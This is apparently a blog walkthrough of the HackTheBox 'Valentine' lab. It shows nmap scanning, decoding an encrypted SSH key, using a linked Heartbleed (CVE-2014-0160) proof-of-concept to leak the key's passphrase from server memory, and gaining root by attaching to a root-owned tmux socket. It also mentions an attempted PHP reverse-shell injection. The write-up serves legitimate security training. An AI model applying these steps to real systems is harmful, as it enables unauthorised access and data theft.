---
title: HackTheBox - Valentine
date: 2020-12-25 20:45:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, nmap scan vuln, CVE-2014-0160, heartbleed, linpeas, tmux, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/valentine.png
---

## Foothold

### `nmap` scan (open ports)

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Valentine-full-port-scan.txt 10.10.10.79
Warning: 10.10.10.79 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.79
Host is up (0.099s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-12-24T14:16:15+00:00; +3m43s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Apache/2.2.22 (port 443)

Thanks to the [`nmap` scan](#nmap-scan-open-ports) we can identify a domain name: `valentine.htb`. Let's add it to `/etc/hosts`.

#### `dirb`

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/dirb.png)

There is `cgi-bin` directory, is it to vulnerable to **Shellshock** ? Let's look for `.sh` file:

![sh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/sh.png)

Nothing found. Let's check the URLs that `dirb` has highlighted.

#####  `/dev` directory

There are two files in the `/dev` directory: 

![dev](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/dev.png)

- **notes.txt**:

![notes](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/notes.png)

- **hype_key**:

![hype_key](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/hype_key.png)

###### cyberchef

Via [CyberChef](https://gchq.github.io/CyberChef/), we decoded **hype_key**:

![cyberchef](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/cyberchef.png)

Since it's an **encrypted** RSA private key (as we can see on line 2), I will not try to log in with ssh, because it will certainly ask for the private key's password.

###### XSS / PHP injection

I saw that we can inject html/javascript code in both `/encode` and `/decode` directories:

![xss](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/xss-3.png)

So I tried to inject a tiny PHP reverse shell:

![php injection](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/php-injection.png)

After multiple attempts, I was pissed off so I ran another nmap scan.

### `nmap` scan (vuln)

```bash
$ nmap -min-rate 5000 --max-retries 1 --script vuln -oN vuln-scan.txt 10.10.10.79
```

![heartbleed](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/heartbleed.png)

The web server seems vulnerable to the **Heartbleed vulnerability** that affects OpenSSL. 

![xkcd heatbleed explanation](https://https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentines.xkcd.com/comics/heartbleed_explanation.png)

> The Heartbleed bug allows anyone on the Internet to read the memory of the systems affected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users. [Source: [heartbleed.com](https://heartbleed.com/)]

We can confirm this by using `sslyze`:

![sslyze](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/sslyze.png)

In order to exploit it, we can use this [PoC script](https://gist.github.com/eelsivart/10174134).

When running the script we get an output with a lot of useless 00's:

```bash
$ python heartbleed.py 

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
$ python heartbleed.py $TARGET
```

![00](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/00.png)

Changing the line 116 allows us to reduce the payload size (0x40 to 0x10):

![payload length](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/payload_length.png)

We can run the script multiple times via the `-n` option. By doing so, we are able to read target's memory's content:

![secret](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/secret.png)
img
$ echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

`heartbleedbelievethehype` is probably the passphrase of the `hype_key` we found earlier. Let's give it a try with `hype` as username _(because of the filename)_ :

![ssh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/ssh.png)

## User (hype)

```bash
hype@Valentine:~/Desktop$ cat user.txt 
e6710a5464769fd5fcd216e076961750
hype@Valentine:~/Desktop$ 
```

This time, we do not know the password of the user so we cannot use `sudo` to check if there is a way to perform a privilege escalation.

Therefore, I will use [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to perform enumeration on the system.

> The URL [https://linpeas.sh/](https://linpeas.sh/) exists :D

There are unexpected directories in `/` that we have access:

![unexpected in root](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/linpeas-1.png)

![/.devs directory](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/devs.png)

The process below leads us to a privesc:

![strange process](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/linpeas-3.png)

```bash
hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
```

## Root

![root](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/valentine/root.png)

___

## Useful links

- [CyberChef](https://gchq.github.io/CyberChef/)
- [CVE-2014-0160](http://cvedetails.com/cve/2014-0160/)
- [Heartbleed](https://heartbleed.com/)
- [Heartbleed exploit PoC](https://gist.github.com/eelsivart/10174134)
